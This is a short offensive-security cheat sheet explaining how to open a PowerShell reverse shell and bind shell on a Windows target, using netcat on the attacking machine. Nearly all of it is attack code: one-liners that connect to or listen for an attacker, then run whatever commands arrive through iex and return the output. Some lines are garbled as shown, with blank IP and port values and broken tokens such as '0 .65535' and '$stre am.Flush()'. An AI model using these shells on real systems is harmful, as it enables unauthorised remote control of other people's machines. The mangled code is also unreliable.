--- ---

PowerShell is a command-line tool for Windows that can automate tasks and execute commands remotely. It has a powerful feature to create a reverse shell and obtain a shell on a remote system using the "New-Object".

<h3>Reverse Shell</h3>

Start Netcat on the attacking machine
```
nc -lvnp <PORT>
```

- -l to create a listener
- -v to add some verbosity
- -n option to disable DNS name resolution
- -p to specify the listening port number

This makes the connection and passes off the shell information (i.e. /bin/bash, cmd.exe, powershell.exe):
```
powershell -c "$client = New-Object System.Net.Sockets.TCPClient('', );$stream = $client.GetStream();[byte[]]$bytes = 0 .65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding] :ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stre am.Flush()};$client.Close()"
```

---

<h3>Bind Shell</h3>

This starts a listen server and binds the shell information to the open port:
```
powershell -c "$listener = New-Object System.Net.Sockets.TcpListener('0.0.0.0', );$listener.start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream(); [byte[]]$bytes = 0 .65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) {;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding] :ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stre am.Flush()};$client.Close();$listener.Stop()"
```

Start Netcat on the attacking machine
```
nc -nv <IP-OF-TARGET> <PORT>
```
- -n option to disable DNS name resolution
- -v to add some verbosity